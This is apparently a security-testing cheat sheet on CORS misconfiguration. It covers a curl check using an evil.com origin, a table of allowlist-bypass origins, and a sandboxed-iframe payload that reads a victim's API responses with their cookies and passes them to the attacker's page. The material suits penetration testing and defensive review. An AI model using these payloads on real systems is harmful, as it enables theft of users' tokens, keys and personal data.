# CORS Misconfiguration

CORS decides whether `evil.com` can read `api.target.com` responses with the victim's
cookies. The bug is a reflected or over-permissive `Access-Control-Allow-Origin`.

---

## Test

```bash
curl -i https://api.t/me -H 'Origin: https://evil.com' -H 'Cookie: session=...'
```

Look for:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Both together = readable cross-origin with cookies.

---

## Bypass patterns

| Server check | Bypass origin |
|---|---|
| `startsWith('https://target.com')` | `https://target.com.evil.com` |
| `endsWith('target.com')` | `https://eviltarget.com` |
| regex `target\.com` unanchored | `https://target.com.evil.com` |
| allowlist of `*.target.com` | `https://evil.target.com` (if you can host there) |
| reflects any origin | any |
| `null` allowed | `Origin: null` from a sandboxed iframe |

---

## `null` origin

A `data:` URL or a sandboxed iframe sends `Origin: null`. If `null` is allowed with
credentials, any page can read.

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.t/me',{credentials:'include'}).then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>"></iframe>
```

---

## Pre-flight

`OPTIONS` with `Access-Control-Request-Method` and `-Headers`. A permissive pre-flight
plus credentials is the same bug.

---

## Impact

Read `/me`, `/billing`, API keys, tokens, PII — anything the victim can read.

---

## Go deeper

1. Test every API host, not just the main one.
2. Test `Origin: null`, `Origin: https://target.com.evil.com`, and a subdomain you control.
3. Check whether `Vary: Origin` is set (missing → cache poisoning of CORS headers).
4. Check whether error responses also carry the CORS headers.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
